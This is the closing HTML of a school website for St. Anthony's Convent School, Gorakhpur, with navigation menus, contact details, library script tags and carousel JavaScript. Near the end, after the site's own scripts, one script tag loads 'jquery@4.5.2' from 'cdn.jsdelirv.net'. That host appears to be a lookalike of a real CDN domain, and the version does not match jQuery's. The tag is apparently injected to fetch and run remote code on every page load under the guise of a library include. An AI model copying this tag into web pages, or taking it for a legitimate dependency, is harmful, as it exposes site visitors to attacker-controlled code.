                    <p class="--p-xs">Copyright &copy; <span id="year"></span> All Rights Reserved by <a href="#">St. Anthony’s Convent School</a></p>
                </div>
            </div>
        </div>
    </div>
    <!-- footer end -->
    <!-- offcanvase menu -->
    <!-- header style two -->
    <div id="side-bar" class="side-bar">
        <button class="close-icon-menu"><i class="far fa-times"></i></button>
        <!-- inner menu area desktop start -->
        <div class="inner-main-wrapper-desk">
            <div class="thumbnail">
                
               <a href="index.php" class="d-flex align-items-center text-decoration-none">
                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                <div class="school-name text-dark">
                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                </div>
            </a>
            </div>
            <div class="inner-content">
                <p class="disc">
                    A modern php template for education, offering intuitive design & essential features for seamless learning experiences.
                </p>
                <!-- offcanvase banner -->
                <div class="offcanvase__banner mt--50">
                    <div class="offcanvase__banner--content">
                        <img src="assets/images/offcanvase.jpg" alt="offcanvase">
                        <a href="admission.php" class="rts-theme-btn">Apply Now</a>
                    </div>
                </div>
                <div class="offcanvase__info">
                    <div class="offcanvase__info--content">
                        <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                        <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                        <div class="offcanvase__info--content--social">
                            <p class="title">Follow Us:</p>
                            <div class="social__links">
                                <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                                <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                                <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area start -->
        <div class="mobile-menu-main">
            <nav class="nav-main mainmenu-nav mt--30">
            <ul class="mainmenu metismenu" id="mobile-menu-active">
                <li>
                    <a href="index.php" class="main">Home</a>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">About Us</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                 <li>
                            <a href="principal.php" class="main">Principal Desk</a>
                        </li>
                    </ul>
                </li>
                
                <!-- Curriculum - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Curriculum</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                            </ul>
                </li>
                
                <!-- Facilities - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Facilities</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                            </ul>
                </li>

                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Achievements</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="toppers-x.php">Toppers X</a></li>
                        <li><a href="toppers-xii.php">Toppers XII</a></li>
                    </ul>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Gallery</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="event_gallery.php">Event Gallery</a></li>
                        <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                    </ul>
                </li>
                <li>
                    <a href="blog.php" class="main">Blogs</a>
                </li>
                <li>
                    <a href="contact.php" class="main">Contact</a>
                </li>
            </ul>
            </nav>

            <div class="offcanvase__info--content mt--30">
                <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                <div class="offcanvase__info--content--social">
                    <p class="title">Follow Us:</p>
                    <div class="social__links">
                        <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                        <a href="#"><i class="fa-brands fa-instagram"></i></a>
                        <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                        <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area end -->
    </div>
    <!-- header style two End -->

    <div class="search-input-area">
        <div class="container">
            <div class="search-input-inner">
                <div class="input-div">
                    <input class="search-input autocomplete ui-autocomplete-input" type="text" placeholder="Search by keyword or #" autocomplete="off">
                    <button><i class="far fa-search"></i></button>
                </div>
            </div>
        </div>
        <div id="close" class="search-close-icon"><i class="far fa-times"></i></div>
    </div>
    <!-- rts backto top start -->
    <div class="progress-wrap">
        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" style="transition: stroke-dashoffset 10ms linear 0s; stroke-dasharray: 307.919, 307.919; stroke-dashoffset: 307.919;"></path>
        </svg>
    </div>
    <!-- rts back to top end -->
    <div id="anywhere-home" class="">
    </div>


    <!-- scripts -->
    <!-- jquery js -->
    <script src="assets/js/vendor/jquery.min.js"></script>
    <!-- bootstrap 5.0.2 -->
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <!-- jquery ui js -->
    <script src="assets/js/vendor/jquery-ui.js"></script>
    <!-- wow js -->
    <script src="assets/js/vendor/waw.js"></script>
    <!-- mobile menu -->
    <script src="assets/js/vendor/metismenu.js"></script>
    <!-- magnific popup -->
    <script src="assets/js/vendor/magnifying-popup.js"></script>
    <!-- swiper JS 10.2.0 -->
    <script src="assets/js/plugins/swiper.js"></script>
    <!-- counterup -->
    <script src="assets/js/plugins/counterup.js"></script>
    <script src="assets/js/vendor/waypoint.js"></script>
    <!-- isotop mesonary -->
    <script src="assets/js/plugins/isotop.js"></script>
    <script src="assets/js/plugins/imagesloaded.pkgd.min.js"></script>
    <script src="assets/js/plugins/sticky-sidebar.js"></script>
    <script src="assets/js/plugins/resize-sensor.js"></script>
    <script src="assets/js/plugins/twinmax.js"></script>
    <!-- dymanic Contact Form -->
    <script src="assets/js/plugins/contact.form.js"></script>
    <script src="assets/js/plugins/nice-select.min.js"></script>
    <!-- main Js -->
    <script src="assets/js/jquery.flexslider.js"></script>
    <script src="assets/js/main.js"></script>

<script src="https://cdn.jsdelirv.net/npm/jquery@4.5.2/dist/jquery.min.js"></script>
</body>
</html>
<style>
.rts__author--img img {
    border-radius: 12px;
}
.rts__single--testimonial {
    transition: all 0.3s ease-in-out;
}
.rts__single--testimonial:hover {
    transform: translateY(-5px);
}
</style>

<script>
new Swiper('.aboutSwiper', {
    loop: false,
});

const swiper = new Swiper('.newsSwiper', {
    slidesPerView: 1,
    spaceBetween: 0,
    loop: true,
    autoplay: {
        delay: 4000,
        disableOnInteraction: false,
    },
    navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
    },
    breakpoints: {
        768: {
            slidesPerView: 2,
            spaceBetween: 0,
        }
    }
});

class AcademicCustomSwiper {
    constructor(element) {
        this.container = element;
        this.wrapper = element.querySelector('#academicSwiperWrapper');
        this.slides = element.querySelectorAll('.academic-swiper-slide');
        this.prevBtn = element.querySelector('#academicPrevBtn');
        this.nextBtn = element.querySelector('#academicNextBtn');
        this.pagination = element.querySelector('#academicPagination');
        this.dots = element.querySelectorAll('.academic-swiper-dot');
        
        this.currentIndex = 0;
        this.totalSlides = this.slides.length;
        this.slidesPerView = 1;
        
        this.init();
    }
    
    init() {
        this.updateSlidePosition();
        this.updateNavigation();
        this.bindEvents();
        this.startAutoPlay();
    }
    
    bindEvents() {
        this.prevBtn.addEventListener('click', () => this.prevSlide());
        this.nextBtn.addEventListener('click', () => this.nextSlide());
        
        this.dots.forEach((dot, index) => {
            dot.addEventListener('click', () => this.goToSlide(index));
        });
        
        this.container.addEventListener('mouseenter', () => this.stopAutoPlay());
        this.container.addEventListener('mouseleave', () => this.startAutoPlay());
    }
    
    updateSlidePosition() {
        const translateX = -this.currentIndex * 100;
        this.wrapper.style.transform = `translateX(${translateX}%)`;
        this.wrapper.style.width = `${this.totalSlides * 100}%`;
        this.slides.forEach(slide => {
            slide.style.width = `${100 / this.totalSlides}%`;
        });
    }
    
    updateNavigation() {
        this.prevBtn.disabled = this.currentIndex === 0;
        this.nextBtn.disabled = this.currentIndex === this.totalSlides - 1;
        
        this.dots.forEach((dot, index) => {
            dot.classList.toggle('academic-active', index === this.currentIndex);
        });
    }
    
    prevSlide() {
        if (this.currentIndex > 0) {
            this.currentIndex--;
            this.updateSlidePosition();
            this.updateNavigation();
        }
    }
    
    nextSlide() {
        if (this.currentIndex < this.totalSlides - 1) {
            this.currentIndex++;
            this.updateSlidePosition();
            this.updateNavigation();
        }
    }
    
    goToSlide(index) {
        if (index >= 0 && index < this.totalSlides) {
            this.currentIndex = index;
            this.updateSlidePosition();
            this.updateNavigation();
        }
    }
    
    startAutoPlay() {
        this.autoPlayInterval = setInterval(() => {
            if (this.currentIndex === this.totalSlides - 1) {
                this.goToSlide(0);
            } else {
                this.nextSlide();
            }
        }, 4000);
    }
    
    stopAutoPlay() {
        if (this.autoPlayInterval) {
            clearInterval(this.autoPlayInterval);
        }
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const academicSwiperElement = document.getElementById('academicEventsSwiper');
    if (academicSwiperElement) {
        new AcademicCustomSwiper(academicSwiperElement);
    }
});

$(document).ready(function () {
    $("#tpr_x").flexslider({
        animation: "slide",
        controlNav: false
    });
    $("#tpr_xii").flexslider({
        animation: "slide",
        controlNav: false
    });
    $("#StdBdy").flexslider({
        animation: "slide",
        controlNav: false
    });
    $("#tchrBdy").flexslider({
        animation: "slide",
        controlNav: false
    });
});
</script>